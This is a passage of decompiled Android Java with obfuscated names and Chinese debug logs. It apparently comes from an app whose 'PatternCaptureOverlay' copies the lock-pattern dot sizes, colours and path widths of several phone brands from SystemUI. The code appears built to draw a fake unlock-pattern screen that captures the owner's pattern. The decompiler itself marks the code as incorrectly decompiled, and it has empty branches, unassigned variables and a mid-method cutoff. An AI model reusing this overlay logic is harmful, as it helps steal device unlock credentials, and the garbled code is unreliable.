    /* JADX WARN: Removed duplicated region for block: B:103:0x0376 A[Catch: Exception -> 0x005b, TryCatch #1 {Exception -> 0x005b, blocks: (B:5:0x002b, B:8:0x0051, B:15:0x005f, B:17:0x006f, B:22:0x007a, B:25:0x00a1, B:28:0x00e6, B:35:0x0188, B:62:0x028d, B:64:0x0295, B:67:0x02a1, B:78:0x02c3, B:80:0x02cc, B:91:0x0306, B:92:0x031f, B:95:0x0329, B:97:0x0337, B:100:0x0344, B:101:0x034c, B:141:0x04b1, B:144:0x04d1, B:145:0x04ed, B:103:0x0376, B:105:0x0380, B:107:0x038e, B:110:0x039b, B:111:0x03a3, B:112:0x03c6, B:114:0x03cc, B:116:0x03da, B:119:0x03e7, B:120:0x03ef, B:121:0x0413, B:123:0x0419, B:125:0x0427, B:128:0x0434, B:129:0x043c, B:130:0x0460, B:132:0x0466, B:134:0x0474, B:137:0x0481, B:138:0x0489, B:71:0x02ab, B:73:0x02b3, B:75:0x02b9, B:66:0x029b, B:30:0x010f, B:32:0x0137, B:33:0x0160, B:38:0x01aa, B:40:0x01b9, B:45:0x01c6, B:47:0x01d8, B:48:0x01dc, B:50:0x01e2, B:52:0x01ee, B:55:0x0216, B:57:0x021e, B:59:0x023b, B:61:0x0260, B:147:0x053c, B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:155:0x002b, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:141:0x04b1 A[Catch: Exception -> 0x005b, TryCatch #1 {Exception -> 0x005b, blocks: (B:5:0x002b, B:8:0x0051, B:15:0x005f, B:17:0x006f, B:22:0x007a, B:25:0x00a1, B:28:0x00e6, B:35:0x0188, B:62:0x028d, B:64:0x0295, B:67:0x02a1, B:78:0x02c3, B:80:0x02cc, B:91:0x0306, B:92:0x031f, B:95:0x0329, B:97:0x0337, B:100:0x0344, B:101:0x034c, B:141:0x04b1, B:144:0x04d1, B:145:0x04ed, B:103:0x0376, B:105:0x0380, B:107:0x038e, B:110:0x039b, B:111:0x03a3, B:112:0x03c6, B:114:0x03cc, B:116:0x03da, B:119:0x03e7, B:120:0x03ef, B:121:0x0413, B:123:0x0419, B:125:0x0427, B:128:0x0434, B:129:0x043c, B:130:0x0460, B:132:0x0466, B:134:0x0474, B:137:0x0481, B:138:0x0489, B:71:0x02ab, B:73:0x02b3, B:75:0x02b9, B:66:0x029b, B:30:0x010f, B:32:0x0137, B:33:0x0160, B:38:0x01aa, B:40:0x01b9, B:45:0x01c6, B:47:0x01d8, B:48:0x01dc, B:50:0x01e2, B:52:0x01ee, B:55:0x0216, B:57:0x021e, B:59:0x023b, B:61:0x0260, B:147:0x053c, B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:155:0x002b, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:144:0x04d1 A[Catch: Exception -> 0x005b, TryCatch #1 {Exception -> 0x005b, blocks: (B:5:0x002b, B:8:0x0051, B:15:0x005f, B:17:0x006f, B:22:0x007a, B:25:0x00a1, B:28:0x00e6, B:35:0x0188, B:62:0x028d, B:64:0x0295, B:67:0x02a1, B:78:0x02c3, B:80:0x02cc, B:91:0x0306, B:92:0x031f, B:95:0x0329, B:97:0x0337, B:100:0x0344, B:101:0x034c, B:141:0x04b1, B:144:0x04d1, B:145:0x04ed, B:103:0x0376, B:105:0x0380, B:107:0x038e, B:110:0x039b, B:111:0x03a3, B:112:0x03c6, B:114:0x03cc, B:116:0x03da, B:119:0x03e7, B:120:0x03ef, B:121:0x0413, B:123:0x0419, B:125:0x0427, B:128:0x0434, B:129:0x043c, B:130:0x0460, B:132:0x0466, B:134:0x0474, B:137:0x0481, B:138:0x0489, B:71:0x02ab, B:73:0x02b3, B:75:0x02b9, B:66:0x029b, B:30:0x010f, B:32:0x0137, B:33:0x0160, B:38:0x01aa, B:40:0x01b9, B:45:0x01c6, B:47:0x01d8, B:48:0x01dc, B:50:0x01e2, B:52:0x01ee, B:55:0x0216, B:57:0x021e, B:59:0x023b, B:61:0x0260, B:147:0x053c, B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:155:0x002b, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:59:0x023b A[Catch: Exception -> 0x005b, TryCatch #1 {Exception -> 0x005b, blocks: (B:5:0x002b, B:8:0x0051, B:15:0x005f, B:17:0x006f, B:22:0x007a, B:25:0x00a1, B:28:0x00e6, B:35:0x0188, B:62:0x028d, B:64:0x0295, B:67:0x02a1, B:78:0x02c3, B:80:0x02cc, B:91:0x0306, B:92:0x031f, B:95:0x0329, B:97:0x0337, B:100:0x0344, B:101:0x034c, B:141:0x04b1, B:144:0x04d1, B:145:0x04ed, B:103:0x0376, B:105:0x0380, B:107:0x038e, B:110:0x039b, B:111:0x03a3, B:112:0x03c6, B:114:0x03cc, B:116:0x03da, B:119:0x03e7, B:120:0x03ef, B:121:0x0413, B:123:0x0419, B:125:0x0427, B:128:0x0434, B:129:0x043c, B:130:0x0460, B:132:0x0466, B:134:0x0474, B:137:0x0481, B:138:0x0489, B:71:0x02ab, B:73:0x02b3, B:75:0x02b9, B:66:0x029b, B:30:0x010f, B:32:0x0137, B:33:0x0160, B:38:0x01aa, B:40:0x01b9, B:45:0x01c6, B:47:0x01d8, B:48:0x01dc, B:50:0x01e2, B:52:0x01ee, B:55:0x0216, B:57:0x021e, B:59:0x023b, B:61:0x0260, B:147:0x053c, B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:155:0x002b, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:60:0x025e  */
    /* JADX WARN: Removed duplicated region for block: B:64:0x0295 A[Catch: Exception -> 0x005b, TryCatch #1 {Exception -> 0x005b, blocks: (B:5:0x002b, B:8:0x0051, B:15:0x005f, B:17:0x006f, B:22:0x007a, B:25:0x00a1, B:28:0x00e6, B:35:0x0188, B:62:0x028d, B:64:0x0295, B:67:0x02a1, B:78:0x02c3, B:80:0x02cc, B:91:0x0306, B:92:0x031f, B:95:0x0329, B:97:0x0337, B:100:0x0344, B:101:0x034c, B:141:0x04b1, B:144:0x04d1, B:145:0x04ed, B:103:0x0376, B:105:0x0380, B:107:0x038e, B:110:0x039b, B:111:0x03a3, B:112:0x03c6, B:114:0x03cc, B:116:0x03da, B:119:0x03e7, B:120:0x03ef, B:121:0x0413, B:123:0x0419, B:125:0x0427, B:128:0x0434, B:129:0x043c, B:130:0x0460, B:132:0x0466, B:134:0x0474, B:137:0x0481, B:138:0x0489, B:71:0x02ab, B:73:0x02b3, B:75:0x02b9, B:66:0x029b, B:30:0x010f, B:32:0x0137, B:33:0x0160, B:38:0x01aa, B:40:0x01b9, B:45:0x01c6, B:47:0x01d8, B:48:0x01dc, B:50:0x01e2, B:52:0x01ee, B:55:0x0216, B:57:0x021e, B:59:0x023b, B:61:0x0260, B:147:0x053c, B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:155:0x002b, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:66:0x029b A[Catch: Exception -> 0x005b, TryCatch #1 {Exception -> 0x005b, blocks: (B:5:0x002b, B:8:0x0051, B:15:0x005f, B:17:0x006f, B:22:0x007a, B:25:0x00a1, B:28:0x00e6, B:35:0x0188, B:62:0x028d, B:64:0x0295, B:67:0x02a1, B:78:0x02c3, B:80:0x02cc, B:91:0x0306, B:92:0x031f, B:95:0x0329, B:97:0x0337, B:100:0x0344, B:101:0x034c, B:141:0x04b1, B:144:0x04d1, B:145:0x04ed, B:103:0x0376, B:105:0x0380, B:107:0x038e, B:110:0x039b, B:111:0x03a3, B:112:0x03c6, B:114:0x03cc, B:116:0x03da, B:119:0x03e7, B:120:0x03ef, B:121:0x0413, B:123:0x0419, B:125:0x0427, B:128:0x0434, B:129:0x043c, B:130:0x0460, B:132:0x0466, B:134:0x0474, B:137:0x0481, B:138:0x0489, B:71:0x02ab, B:73:0x02b3, B:75:0x02b9, B:66:0x029b, B:30:0x010f, B:32:0x0137, B:33:0x0160, B:38:0x01aa, B:40:0x01b9, B:45:0x01c6, B:47:0x01d8, B:48:0x01dc, B:50:0x01e2, B:52:0x01ee, B:55:0x0216, B:57:0x021e, B:59:0x023b, B:61:0x0260, B:147:0x053c, B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:155:0x002b, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:69:0x02a7 A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:71:0x02ab A[Catch: Exception -> 0x005b, TryCatch #1 {Exception -> 0x005b, blocks: (B:5:0x002b, B:8:0x0051, B:15:0x005f, B:17:0x006f, B:22:0x007a, B:25:0x00a1, B:28:0x00e6, B:35:0x0188, B:62:0x028d, B:64:0x0295, B:67:0x02a1, B:78:0x02c3, B:80:0x02cc, B:91:0x0306, B:92:0x031f, B:95:0x0329, B:97:0x0337, B:100:0x0344, B:101:0x034c, B:141:0x04b1, B:144:0x04d1, B:145:0x04ed, B:103:0x0376, B:105:0x0380, B:107:0x038e, B:110:0x039b, B:111:0x03a3, B:112:0x03c6, B:114:0x03cc, B:116:0x03da, B:119:0x03e7, B:120:0x03ef, B:121:0x0413, B:123:0x0419, B:125:0x0427, B:128:0x0434, B:129:0x043c, B:130:0x0460, B:132:0x0466, B:134:0x0474, B:137:0x0481, B:138:0x0489, B:71:0x02ab, B:73:0x02b3, B:75:0x02b9, B:66:0x029b, B:30:0x010f, B:32:0x0137, B:33:0x0160, B:38:0x01aa, B:40:0x01b9, B:45:0x01c6, B:47:0x01d8, B:48:0x01dc, B:50:0x01e2, B:52:0x01ee, B:55:0x0216, B:57:0x021e, B:59:0x023b, B:61:0x0260, B:147:0x053c, B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:155:0x002b, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:73:0x02b3 A[Catch: Exception -> 0x005b, TryCatch #1 {Exception -> 0x005b, blocks: (B:5:0x002b, B:8:0x0051, B:15:0x005f, B:17:0x006f, B:22:0x007a, B:25:0x00a1, B:28:0x00e6, B:35:0x0188, B:62:0x028d, B:64:0x0295, B:67:0x02a1, B:78:0x02c3, B:80:0x02cc, B:91:0x0306, B:92:0x031f, B:95:0x0329, B:97:0x0337, B:100:0x0344, B:101:0x034c, B:141:0x04b1, B:144:0x04d1, B:145:0x04ed, B:103:0x0376, B:105:0x0380, B:107:0x038e, B:110:0x039b, B:111:0x03a3, B:112:0x03c6, B:114:0x03cc, B:116:0x03da, B:119:0x03e7, B:120:0x03ef, B:121:0x0413, B:123:0x0419, B:125:0x0427, B:128:0x0434, B:129:0x043c, B:130:0x0460, B:132:0x0466, B:134:0x0474, B:137:0x0481, B:138:0x0489, B:71:0x02ab, B:73:0x02b3, B:75:0x02b9, B:66:0x029b, B:30:0x010f, B:32:0x0137, B:33:0x0160, B:38:0x01aa, B:40:0x01b9, B:45:0x01c6, B:47:0x01d8, B:48:0x01dc, B:50:0x01e2, B:52:0x01ee, B:55:0x0216, B:57:0x021e, B:59:0x023b, B:61:0x0260, B:147:0x053c, B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:155:0x002b, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:75:0x02b9 A[Catch: Exception -> 0x005b, TryCatch #1 {Exception -> 0x005b, blocks: (B:5:0x002b, B:8:0x0051, B:15:0x005f, B:17:0x006f, B:22:0x007a, B:25:0x00a1, B:28:0x00e6, B:35:0x0188, B:62:0x028d, B:64:0x0295, B:67:0x02a1, B:78:0x02c3, B:80:0x02cc, B:91:0x0306, B:92:0x031f, B:95:0x0329, B:97:0x0337, B:100:0x0344, B:101:0x034c, B:141:0x04b1, B:144:0x04d1, B:145:0x04ed, B:103:0x0376, B:105:0x0380, B:107:0x038e, B:110:0x039b, B:111:0x03a3, B:112:0x03c6, B:114:0x03cc, B:116:0x03da, B:119:0x03e7, B:120:0x03ef, B:121:0x0413, B:123:0x0419, B:125:0x0427, B:128:0x0434, B:129:0x043c, B:130:0x0460, B:132:0x0466, B:134:0x0474, B:137:0x0481, B:138:0x0489, B:71:0x02ab, B:73:0x02b3, B:75:0x02b9, B:66:0x029b, B:30:0x010f, B:32:0x0137, B:33:0x0160, B:38:0x01aa, B:40:0x01b9, B:45:0x01c6, B:47:0x01d8, B:48:0x01dc, B:50:0x01e2, B:52:0x01ee, B:55:0x0216, B:57:0x021e, B:59:0x023b, B:61:0x0260, B:147:0x053c, B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:155:0x002b, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:80:0x02cc A[Catch: Exception -> 0x005b, TRY_LEAVE, TryCatch #1 {Exception -> 0x005b, blocks: (B:5:0x002b, B:8:0x0051, B:15:0x005f, B:17:0x006f, B:22:0x007a, B:25:0x00a1, B:28:0x00e6, B:35:0x0188, B:62:0x028d, B:64:0x0295, B:67:0x02a1, B:78:0x02c3, B:80:0x02cc, B:91:0x0306, B:92:0x031f, B:95:0x0329, B:97:0x0337, B:100:0x0344, B:101:0x034c, B:141:0x04b1, B:144:0x04d1, B:145:0x04ed, B:103:0x0376, B:105:0x0380, B:107:0x038e, B:110:0x039b, B:111:0x03a3, B:112:0x03c6, B:114:0x03cc, B:116:0x03da, B:119:0x03e7, B:120:0x03ef, B:121:0x0413, B:123:0x0419, B:125:0x0427, B:128:0x0434, B:129:0x043c, B:130:0x0460, B:132:0x0466, B:134:0x0474, B:137:0x0481, B:138:0x0489, B:71:0x02ab, B:73:0x02b3, B:75:0x02b9, B:66:0x029b, B:30:0x010f, B:32:0x0137, B:33:0x0160, B:38:0x01aa, B:40:0x01b9, B:45:0x01c6, B:47:0x01d8, B:48:0x01dc, B:50:0x01e2, B:52:0x01ee, B:55:0x0216, B:57:0x021e, B:59:0x023b, B:61:0x0260, B:147:0x053c, B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:155:0x002b, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:84:0x02da A[Catch: Exception -> 0x02e0, TryCatch #0 {Exception -> 0x02e0, blocks: (B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:153:0x02d4, outer: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:88:0x02e2 A[Catch: Exception -> 0x02e0, TryCatch #0 {Exception -> 0x02e0, blocks: (B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:153:0x02d4, outer: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:95:0x0329 A[Catch: Exception -> 0x005b, TRY_ENTER, TryCatch #1 {Exception -> 0x005b, blocks: (B:5:0x002b, B:8:0x0051, B:15:0x005f, B:17:0x006f, B:22:0x007a, B:25:0x00a1, B:28:0x00e6, B:35:0x0188, B:62:0x028d, B:64:0x0295, B:67:0x02a1, B:78:0x02c3, B:80:0x02cc, B:91:0x0306, B:92:0x031f, B:95:0x0329, B:97:0x0337, B:100:0x0344, B:101:0x034c, B:141:0x04b1, B:144:0x04d1, B:145:0x04ed, B:103:0x0376, B:105:0x0380, B:107:0x038e, B:110:0x039b, B:111:0x03a3, B:112:0x03c6, B:114:0x03cc, B:116:0x03da, B:119:0x03e7, B:120:0x03ef, B:121:0x0413, B:123:0x0419, B:125:0x0427, B:128:0x0434, B:129:0x043c, B:130:0x0460, B:132:0x0466, B:134:0x0474, B:137:0x0481, B:138:0x0489, B:71:0x02ab, B:73:0x02b3, B:75:0x02b9, B:66:0x029b, B:30:0x010f, B:32:0x0137, B:33:0x0160, B:38:0x01aa, B:40:0x01b9, B:45:0x01c6, B:47:0x01d8, B:48:0x01dc, B:50:0x01e2, B:52:0x01ee, B:55:0x0216, B:57:0x021e, B:59:0x023b, B:61:0x0260, B:147:0x053c, B:82:0x02d4, B:84:0x02da, B:89:0x02f0, B:88:0x02e2), top: B:155:0x002b, inners: #0 }] */
    /* renamed from: a9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final xm0 m211846a9() throws Resources.NotFoundException, PackageManager.NameNotFoundException {
        xm0 xm0Var;
        int dimensionPixelSize;
        int dimensionPixelSize2;
        int i;
        int i2;
        int i3;
        int identifier;
        int dimensionPixelSize3;
        int identifier2;
        int dimensionPixelSize4;
        float f;
        int iM211842a5;
        int color;
        int identifier3;
        float f2;
        try {
            Context contextCreatePackageContext = this.f53347a1.createPackageContext("com.android.systemui", 2);
            Resources resources = contextCreatePackageContext.getResources();
            xm0Var = null;
            try {
                float f3 = Resources.getSystem().getDisplayMetrics().density;
                String str = Build.BRAND;
                t60.m214694b5(str, "BRAND");
                Locale locale = Locale.ROOT;
                String lowerCase = str.toLowerCase(locale);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                boolean z = lowerCase.equals("vivo") || lowerCase.equals("iqoo");
                t60.m214694b5(str, "BRAND");
                String lowerCase2 = str.toLowerCase(locale);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                t60.m214714d6("PatternCaptureOverlay", "★ 品牌检测: Build.BRAND=" + lowerCase + ", isVivo=" + z + ", LocateValuesHelper.isVivo()=" + (lowerCase2.equals("vivo") || lowerCase2.equals("iqoo")));
                if (!z) {
                    String lowerCase3 = str.toLowerCase(locale);
                    t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    boolean z2 = lowerCase3.equals("huawei") || lowerCase3.equals("honor");
                    List<String> listM213306g5 = AbstractC0716jf.m213306g5("hwlock_pattern_dot_size", "hw_pattern_dot_size", "hw_lock_pattern_dot_size", "keyguard_pattern_dot_size");
                    if (z2) {
                        for (String str2 : listM213306g5) {
                            int identifier4 = resources.getIdentifier(str2, "dimen", "com.android.systemui");
                            if (identifier4 != 0) {
                                dimensionPixelSize = resources.getDimensionPixelSize(identifier4);
                                t60.m214714d6("PatternCaptureOverlay", "★ Huawei SystemUI dot_size（" + str2 + "）=" + dimensionPixelSize + "px");
                                break;
                            }
                        }
                        dimensionPixelSize = 0;
                        if (dimensionPixelSize == 0 && (identifier = resources.getIdentifier("lock_pattern_dot_size", "dimen", "com.android.systemui")) != 0) {
                            dimensionPixelSize = resources.getDimensionPixelSize(identifier);
                            t60.m214714d6("PatternCaptureOverlay", "★ SystemUI dot_size（AOSP）=" + dimensionPixelSize + "px");
                        }
                        if (dimensionPixelSize <= 0) {
                            int i4 = dimensionPixelSize * 3;
                            t60.m214714d6("PatternCaptureOverlay", "★ haloSize=" + i4 + "px, innerDot=" + dimensionPixelSize + "px");
                            i2 = i4;
                            i3 = dimensionPixelSize;
                            dimensionPixelSize3 = 0;
                        } else {
                            if (!z2) {
                                t60.m214726f4("PatternCaptureOverlay", "SystemUI 中未找到 lock_pattern_dot_size");
                                return null;
                            }
                            dimensionPixelSize2 = (int) (11 * f3);
                            i = (int) (32 * f3);
                            t60.m214726f4("PatternCaptureOverlay", "★ Huawei SystemUI 未找到任何点大小资源，使用硬编码兜底: innerDot=" + dimensionPixelSize2 + "px, halo=" + i + "px");
                        }
                    } else {
                        dimensionPixelSize = 0;
                        if (dimensionPixelSize == 0) {
                            dimensionPixelSize = resources.getDimensionPixelSize(identifier);
                            t60.m214714d6("PatternCaptureOverlay", "★ SystemUI dot_size（AOSP）=" + dimensionPixelSize + "px");
                        }
                        if (dimensionPixelSize <= 0) {
                        }
                    }
                    int identifier5 = resources.getIdentifier("lock_pattern_dot_size_activated", "dimen", "com.android.systemui");
                    int dimensionPixelSize5 = identifier5 != 0 ? resources.getDimensionPixelSize(identifier5) : (int) (i2 * 1.5f);
                    if (!AbstractC1117qo.m214449e5()) {
                        identifier2 = resources.getIdentifier("lock_pattern_dot_line_width", "dimen", "com.android.systemui");
                        if (identifier2 == 0) {
                        }
                        dimensionPixelSize3 = dimensionPixelSize4;
                    }
                    int i5 = dimensionPixelSize3;
                    f = 0.1f;
                    if (AbstractC1117qo.m214448e4()) {
                        if (Build.VERSION.SDK_INT < 29) {
                        }
                        f = f2;
                        t60.m214714d6("PatternCaptureOverlay", "★ OPPO outerCircleMaxAlpha=" + f);
                    }
                    float f4 = f;
                    if (AbstractC1117qo.m214448e4()) {
                    }
                    int i6 = color;
                    color = color;
                    iM211842a5 = i6;
                    if (color == 0) {
                    }
                    int i7 = color;
                    if (iM211842a5 == 0) {
                    }
                    int i8 = iM211842a5;
                    t60.m214714d6("PatternCaptureOverlay", "★ SystemUI资源读取成功: haloSize=" + i2 + "px, innerDot=" + i3 + "px, dotSelected=" + dimensionPixelSize5 + "px, pathWidth=" + i5 + "px, dotColor=#" + Integer.toHexString(i7) + ", pathColor=#" + Integer.toHexString(i8) + ", outerCircleAlpha=" + f4);
                    return new xm0(i2, i3, dimensionPixelSize5, i7, i8, i5, f4);
                }
                int identifier6 = resources.getIdentifier("vivo_keyguard_select_point_width", "dimen", "com.android.systemui");
                int identifier7 = resources.getIdentifier("vivo_keyguard_spring_patten_point_width", "dimen", "com.android.systemui");
                int identifier8 = resources.getIdentifier("vivo_keyguard_path_width", "dimen", "com.android.systemui");
                int identifier9 = resources.getIdentifier("vivo_pattern_unlock_size", "dimen", "com.android.systemui");
                t60.m214714d6("PatternCaptureOverlay", "★ Vivo 资源ID: selectPointId=" + identifier6 + ", springPointId=" + identifier7 + ", pathWidthId=" + identifier8 + ", patternViewSizeId=" + identifier9);
                if (identifier6 != 0) {
                    dimensionPixelSize2 = resources.getDimensionPixelSize(identifier6);
                    i = (int) (dimensionPixelSize2 * 2.5f);
                    t60.m214714d6("PatternCaptureOverlay", "★ Vivo SystemUI select_point_width=" + dimensionPixelSize2 + "px → haloSize=" + i + "px, innerDot=" + dimensionPixelSize2 + "px");
                } else if (identifier7 != 0) {
                    dimensionPixelSize2 = resources.getDimensionPixelSize(identifier7);
                    i = (int) (dimensionPixelSize2 * 2.5f);
                    t60.m214714d6("PatternCaptureOverlay", "★ Vivo SystemUI spring_patten_point_width=" + dimensionPixelSize2 + "px → haloSize=" + i + "px, innerDot=" + dimensionPixelSize2 + "px");
                } else if (identifier9 != 0) {
                    int dimensionPixelSize6 = resources.getDimensionPixelSize(identifier9);
                    int i9 = dimensionPixelSize6 / 12;
                    int i10 = dimensionPixelSize6 / 8;
                    t60.m214714d6("PatternCaptureOverlay", "★ Vivo 从 pattern_unlock_size 推算: viewSize=" + dimensionPixelSize6 + "px → haloSize=" + i10 + "px, innerDot=" + i9 + "px");
                    dimensionPixelSize2 = i9;
                    i = i10;
                } else {
                    dimensionPixelSize2 = (int) (8 * f3);
                    i = (int) (20 * f3);
                    t60.m214726f4("PatternCaptureOverlay", "★ Vivo SystemUI 资源都找不到，使用兜底值: haloSize=" + i + "px, innerDot=" + dimensionPixelSize2 + "px");
                }
                if (identifier8 != 0) {
                    dimensionPixelSize3 = resources.getDimensionPixelSize(identifier8);
                    t60.m214714d6("PatternCaptureOverlay", "★ Vivo SystemUI path_width=" + dimensionPixelSize3 + "px");
                    i3 = dimensionPixelSize2;
                    i2 = i;
                    int identifier52 = resources.getIdentifier("lock_pattern_dot_size_activated", "dimen", "com.android.systemui");
                    int dimensionPixelSize52 = identifier52 != 0 ? resources.getDimensionPixelSize(identifier52) : (int) (i2 * 1.5f);
                    if (!AbstractC1117qo.m214449e5() || dimensionPixelSize3 <= 0) {
                        identifier2 = resources.getIdentifier("lock_pattern_dot_line_width", "dimen", "com.android.systemui");
                        if (identifier2 == 0) {
                            dimensionPixelSize4 = resources.getDimensionPixelSize(identifier2);
                        } else {
                            dimensionPixelSize4 = (int) (f3 * 3.0f);
                            if (dimensionPixelSize4 < 3) {
                                dimensionPixelSize4 = 3;
                            }
                        }
                        dimensionPixelSize3 = dimensionPixelSize4;
                    }
                    int i52 = dimensionPixelSize3;
                    f = 0.1f;
                    if (AbstractC1117qo.m214448e4() && (identifier3 = resources.getIdentifier("coui_lock_pattern_outer_circle_max_alpha", "dimen", "com.android.systemui")) != 0) {
                        try {
                            if (Build.VERSION.SDK_INT < 29) {
                                f2 = resources.getFloat(identifier3);
                            } else {
                                TypedValue typedValue = new TypedValue();
                                resources.getValue(identifier3, typedValue, true);
                                f2 = typedValue.getFloat();
                            }
                            f = f2;
                            t60.m214714d6("PatternCaptureOverlay", "★ OPPO outerCircleMaxAlpha=" + f);
                        } catch (Exception e) {
                            t60.m214726f4("PatternCaptureOverlay", "读取 outerCircleMaxAlpha 失败, 用默认值 0.1: " + e.getMessage());
                        }
                    }
                    float f42 = f;
                    if (AbstractC1117qo.m214448e4()) {
                        int identifier10 = resources.getIdentifier("coui_lock_pattern_dot_color", "color", "com.android.systemui");
                        int identifier11 = resources.getIdentifier("coui_lock_pattern_path_color", "color", "com.android.systemui");
                        color = identifier10 != 0 ? resources.getColor(identifier10, contextCreatePackageContext.getTheme()) : 0;
                        color = identifier11 != 0 ? resources.getColor(identifier11, contextCreatePackageContext.getTheme()) : 0;
                        t60.m214714d6("PatternCaptureOverlay", "★ OPPO SystemUI颜色: dotColor=#" + Integer.toHexString(color) + ", pathColor=#" + Integer.toHexString(color));
                    } else if (AbstractC0779a1.m213656a9(Build.BRAND, "samsung")) {
                        int identifier12 = resources.getIdentifier("sec_lock_pattern_dot_color", "color", "com.android.systemui");
                        int identifier13 = resources.getIdentifier("sec_lock_pattern_path_color", "color", "com.android.systemui");
                        color = identifier12 != 0 ? resources.getColor(identifier12, contextCreatePackageContext.getTheme()) : 0;
                        color = identifier13 != 0 ? resources.getColor(identifier13, contextCreatePackageContext.getTheme()) : 0;
                        t60.m214714d6("PatternCaptureOverlay", "★ Samsung SystemUI颜色: dotColor=#" + Integer.toHexString(color) + ", pathColor=#" + Integer.toHexString(color));
                    } else if (AbstractC1117qo.m214449e5()) {
                        int identifier14 = resources.getIdentifier("vivo_lock_pattern_dot_color", "color", "com.android.systemui");
                        int identifier15 = resources.getIdentifier("vivo_lock_pattern_path_color", "color", "com.android.systemui");
                        color = identifier14 != 0 ? resources.getColor(identifier14, contextCreatePackageContext.getTheme()) : 0;
                        color = identifier15 != 0 ? resources.getColor(identifier15, contextCreatePackageContext.getTheme()) : 0;
                        t60.m214714d6("PatternCaptureOverlay", "★ Vivo SystemUI颜色: dotColor=#" + Integer.toHexString(color) + ", pathColor=#" + Integer.toHexString(color));
                    } else if (AbstractC1117qo.m214446e2()) {
                        int identifier16 = resources.getIdentifier("hwlock_pattern_dot_color", "color", "com.android.systemui");
                        int identifier17 = resources.getIdentifier("hwlock_pattern_path_color", "color", "com.android.systemui");
                        color = identifier16 != 0 ? resources.getColor(identifier16, contextCreatePackageContext.getTheme()) : 0;
                        color = identifier17 != 0 ? resources.getColor(identifier17, contextCreatePackageContext.getTheme()) : 0;
                        t60.m214714d6("PatternCaptureOverlay", "★ Huawei SystemUI颜色: dotColor=#" + Integer.toHexString(color) + ", pathColor=#" + Integer.toHexString(color));
                    } else {
                        if (!AbstractC1117qo.m214450e6()) {
                            iM211842a5 = 0;
                            if (color == 0) {
                                color = m211842a5();
                                t60.m214714d6("PatternCaptureOverlay", "★ 点颜色兜底主题检测: #" + Integer.toHexString(color));
                            }
                            int i72 = color;
                            if (iM211842a5 == 0) {
                                iM211842a5 = m211842a5();
                                t60.m214714d6("PatternCaptureOverlay", "★ 线颜色兜底主题检测: #" + Integer.toHexString(iM211842a5));
                            }
                            int i82 = iM211842a5;
                            t60.m214714d6("PatternCaptureOverlay", "★ SystemUI资源读取成功: haloSize=" + i2 + "px, innerDot=" + i3 + "px, dotSelected=" + dimensionPixelSize52 + "px, pathWidth=" + i52 + "px, dotColor=#" + Integer.toHexString(i72) + ", pathColor=#" + Integer.toHexString(i82) + ", outerCircleAlpha=" + f42);
                            return new xm0(i2, i3, dimensionPixelSize52, i72, i82, i52, f42);
                        }
                        int identifier18 = resources.getIdentifier("miui_lock_pattern_dot_color", "color", "com.android.systemui");
                        int identifier19 = resources.getIdentifier("miui_lock_pattern_path_color", "color", "com.android.systemui");
                        color = identifier18 != 0 ? resources.getColor(identifier18, contextCreatePackageContext.getTheme()) : 0;
                        color = identifier19 != 0 ? resources.getColor(identifier19, contextCreatePackageContext.getTheme()) : 0;
                        t60.m214714d6("PatternCaptureOverlay", "★ Xiaomi SystemUI颜色: dotColor=#" + Integer.toHexString(color) + ", pathColor=#" + Integer.toHexString(color));
                    }
                    int i62 = color;
                    color = color;
                    iM211842a5 = i62;
                    if (color == 0) {
                    }
                    int i722 = color;
                    if (iM211842a5 == 0) {
                    }
                    int i822 = iM211842a5;
                    t60.m214714d6("PatternCaptureOverlay", "★ SystemUI资源读取成功: haloSize=" + i2 + "px, innerDot=" + i3 + "px, dotSelected=" + dimensionPixelSize52 + "px, pathWidth=" + i52 + "px, dotColor=#" + Integer.toHexString(i722) + ", pathColor=#" + Integer.toHexString(i822) + ", outerCircleAlpha=" + f42);
                    return new xm0(i2, i3, dimensionPixelSize52, i722, i822, i52, f42);
                }
                i3 = dimensionPixelSize2;
                i2 = i;
                dimensionPixelSize3 = 0;
                int identifier522 = resources.getIdentifier("lock_pattern_dot_size_activated", "dimen", "com.android.systemui");
                int dimensionPixelSize522 = identifier522 != 0 ? resources.getDimensionPixelSize(identifier522) : (int) (i2 * 1.5f);
                if (!AbstractC1117qo.m214449e5()) {
                }
                int i522 = dimensionPixelSize3;
                f = 0.1f;
                if (AbstractC1117qo.m214448e4()) {
                }
                float f422 = f;
                if (AbstractC1117qo.m214448e4()) {
                }
                int i622 = color;
                color = color;
                iM211842a5 = i622;
                if (color == 0) {
                }
                int i7222 = color;
